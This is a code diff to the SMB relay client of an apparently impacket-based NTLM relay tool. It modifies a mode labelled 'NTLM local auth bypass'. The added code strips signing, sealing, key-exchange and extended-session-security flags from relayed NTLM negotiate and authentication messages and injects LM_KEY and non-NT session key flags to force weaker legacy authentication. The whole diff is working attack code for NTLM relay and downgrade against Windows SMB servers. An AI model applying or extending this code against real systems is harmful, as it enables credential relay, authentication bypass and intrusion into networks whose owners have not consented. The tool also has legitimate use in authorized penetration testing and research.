@@ -332,9 +332,12 @@ class SMBRelayClient(ProtocolClient):
                 negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_VERSION
         elif self.serverConfig.remove_mic_partial:
             LOG.debug('[SMB] sendNegotiate: Using --remove-mic-partial mode (NTLM local auth bypass)')
-            # Remove signing, sealing, KEY_EXCH, and VERSION flags to match PCAP
-            # PCAP of authentic local SYSTEM auth showed: VERSION=0, KEY_EXCH=1, SEAL=1, SIGN=1
-            # We remove SIGN/SEAL/KEY_EXCH/VERSION to avoid signing requirements
+            # Strategy: Use weaker/legacy flags to bypass modern security checks
+            # Remove modern security flags and add legacy/weak flags
+            from impacket.ntlm import NTLMSSP_NEGOTIATE_LM_KEY, NTLMSSP_REQUEST_NON_NT_SESSION_KEY, \
+                NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY
+
+            # Remove strong auth/signing flags
             if negoMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
                 negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
             if negoMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
@@ -343,10 +346,22 @@ class SMBRelayClient(ProtocolClient):
                 negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_SEAL
             if negoMessage['flags'] & NTLMSSP_NEGOTIATE_KEY_EXCH == NTLMSSP_NEGOTIATE_KEY_EXCH:
                 negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_KEY_EXCH
-                LOG.debug('[SMB] sendNegotiate: Removed KEY_EXCH flag')
             if negoMessage['flags'] & NTLMSSP_NEGOTIATE_VERSION == NTLMSSP_NEGOTIATE_VERSION:
                 negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_VERSION
-                LOG.debug('[SMB] sendNegotiate: Removed VERSION flag to match PCAP')
+            # Remove Extended Session Security to force older, simpler auth path
+            if negoMessage['flags'] & NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY == NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY:
+                negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY
+                LOG.debug('[SMB] sendNegotiate: Removed Extended Session Security')
+
+            # Add weak/legacy flags to request simpler auth
+            # LM_KEY: Use Lan Manager key (weaker, older)
+            if not (negoMessage['flags'] & NTLMSSP_NEGOTIATE_LM_KEY):
+                negoMessage['flags'] |= NTLMSSP_NEGOTIATE_LM_KEY
+                LOG.debug('[SMB] sendNegotiate: Added LM_KEY flag for legacy auth')
+            # REQUEST_NON_NT_SESSION_KEY: Request simpler session key
+            if not (negoMessage['flags'] & NTLMSSP_REQUEST_NON_NT_SESSION_KEY):
+                negoMessage['flags'] |= NTLMSSP_REQUEST_NON_NT_SESSION_KEY
+                LOG.debug('[SMB] sendNegotiate: Added NON_NT_SESSION_KEY flag')
 
         LOG.debug('[SMB] sendNegotiate: Modified NTLM flags: 0x%x' % negoMessage['flags'])
         negotiateMessage = negoMessage.getData()
@@ -634,8 +649,11 @@ class SMBRelayClient(ProtocolClient):
             original_flags = authMessage['flags']
             LOG.debug('[SMB] sendAuth: Original auth flags: 0x%x' % original_flags)
 
-            # Remove SIGN, ALWAYS_SIGN, SEAL, KEY_EXCH, and VERSION flags
-            # Also zero out Version field while keeping MIC intact
+            # Use weak/legacy flags strategy
+            from impacket.ntlm import NTLMSSP_NEGOTIATE_LM_KEY, NTLMSSP_REQUEST_NON_NT_SESSION_KEY, \
+                NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY
+
+            # Remove strong auth/signing flags
             if authMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
                 authMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
             if authMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
@@ -644,16 +662,25 @@ class SMBRelayClient(ProtocolClient):
                 authMessage['flags'] ^= NTLMSSP_NEGOTIATE_SEAL
             if authMessage['flags'] & NTLMSSP_NEGOTIATE_KEY_EXCH == NTLMSSP_NEGOTIATE_KEY_EXCH:
                 authMessage['flags'] ^= NTLMSSP_NEGOTIATE_KEY_EXCH
-                LOG.debug('[SMB] sendAuth: Removed KEY_EXCH flag')
             if authMessage['flags'] & NTLMSSP_NEGOTIATE_VERSION == NTLMSSP_NEGOTIATE_VERSION:
                 authMessage['flags'] ^= NTLMSSP_NEGOTIATE_VERSION
-                # Also zero out the Version field when VERSION flag is removed
                 authMessage['Version'] = b''
                 authMessage['VersionLen'] = 0
-                LOG.debug('[SMB] sendAuth: Removed VERSION flag and zeroed Version field')
-            # Keep MIC intact - do NOT zero out MIC field
+            # Remove Extended Session Security
+            if authMessage['flags'] & NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY == NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY:
+                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY
+                LOG.debug('[SMB] sendAuth: Removed Extended Session Security')
 
-            LOG.debug('[SMB] sendAuth: Modified auth flags: 0x%x, MIC intact, Version removed' % authMessage['flags'])
+            # Add weak/legacy flags
+            if not (authMessage['flags'] & NTLMSSP_NEGOTIATE_LM_KEY):
+                authMessage['flags'] |= NTLMSSP_NEGOTIATE_LM_KEY
+                LOG.debug('[SMB] sendAuth: Added LM_KEY flag')
+            if not (authMessage['flags'] & NTLMSSP_REQUEST_NON_NT_SESSION_KEY):
+                authMessage['flags'] |= NTLMSSP_REQUEST_NON_NT_SESSION_KEY
+                LOG.debug('[SMB] sendAuth: Added NON_NT_SESSION_KEY flag')
+
+            # Keep MIC intact - do NOT zero out MIC field
+            LOG.debug('[SMB] sendAuth: Modified auth flags: 0x%x, using legacy/weak flags' % authMessage['flags'])
 
             # Try to extract/derive session key for SMB operations
             # Log what we have to work with
